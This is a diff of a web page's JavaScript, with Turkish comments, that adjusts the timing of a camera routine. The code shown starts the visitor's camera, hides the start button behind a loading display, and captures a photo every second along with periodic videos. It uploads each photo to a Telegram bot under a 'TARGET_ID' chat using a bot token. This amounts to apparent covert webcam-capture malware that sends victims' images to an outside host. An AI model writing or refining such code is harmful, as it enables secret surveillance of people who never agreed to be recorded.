@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
+            // ==================== KAMERA İŞLEMLERİ - SIFIRLAMA ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -154,6 +154,7 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
+            let baslangicZamani = 0;
             
             async function startCamera() {
                 try {
@@ -172,17 +173,17 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        const baslangicZamani = Date.now();
+                        baslangicZamani = Date.now();
                         
                         // ========================================
-                        // TEK ZAMANLAYICI - requestAnimationFrame
+                        // TEK ZAMANLAYICI
                         // ========================================
                         function anaZamanlayici() {
                             if (!stream?.active) return;
                             
                             const gecenSure = (Date.now() - baslangicZamani) / 1000;
                             
-                            // Video kontrolü - Her VIDEO_SURESI saniyede bir video başlar
+                            // VİDEO: İlk video 5. saniyede başlasın
                             const olmasiGerekenVideo = Math.floor(gecenSure / VIDEO_SURESI);
                             
                             while (videoCount < olmasiGerekenVideo) {
@@ -226,7 +227,7 @@
                                 } catch(e) {}
                             }
                             
-                            // Fotoğraf kontrolü - Her FOTO_SURESI saniyede bir foto çekilir
+                            // FOTOĞRAF: Her saniye foto çek
                             const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                             
                             while (photoCount < olmasiGerekenFoto) {
@@ -241,7 +242,7 @@
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                                    formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                                     
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
